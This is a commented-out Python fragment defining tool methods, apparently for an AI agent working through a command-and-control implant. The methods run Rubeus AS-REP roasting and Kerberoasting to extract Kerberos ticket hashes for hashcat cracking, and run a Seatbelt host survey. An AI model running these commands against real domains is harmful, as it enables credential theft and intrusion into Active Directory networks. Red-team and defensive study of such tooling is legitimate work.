# @tool_method()
# async def rubeus_asreproast(self) -> str:
#     """
#     Execute ASREP-Roast technique against current domain using the Rubeus tool. The technique extracts kerberos ticket-granting tickets for active directory users that dont require pre-authentication on the domain. If ticket-granting tickets can be obtained, they will be returned (in hash form)
#     ."""
#     return await self.execute(
#         command="execute_assembly", args="Rubeus.exe asreproast /format:hashcat"
#     )

# @tool_method()
# async def rubeus_kerberoast(
#     self,
#     cred_user: t.Annotated[
#         str,
#         "principal domain user to execute the command under, formatted in fqdn format: 'domain\\user'",
#     ],
#     cred_password: t.Annotated[str, "principal domain user password"],
#     user: t.Annotated[str | None, "specific domain user to target for kerberoasting"] = None,
#     spn: t.Annotated[str | None, "specific SPN to target for kerberoasting"] = None,
# ) -> str:
#     """
#     Kerberoast a user current domain using the Rubeus tool. The tool extracts kerberos ticket-granting tickets for active directory users that have service principal names (SPNs) set. To use 'rubeus_kerberoast' tool, you must have a username and password of existing user on the active directory domain. If ticket-granting tickets for the SPN accounts can be obtained, they will be returned (in a hash format).
#     """
#     args = f"Rubeus.exe kerberoast /creduser:{cred_user} /credpassword:{cred_password} /format:hashcat"

#     if user is not None:
#         args += f" /user:{user}"

#     if spn is not None:
#         args += f" /spn:{spn}"

#     return await self.execute(command="execute_assembly", args=args)

# @tool_method()
# async def seatbelt(self) -> str:
#     """Performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives."""
#     return await self.execute(command="execute_assembly", args="Seatbelt.exe")
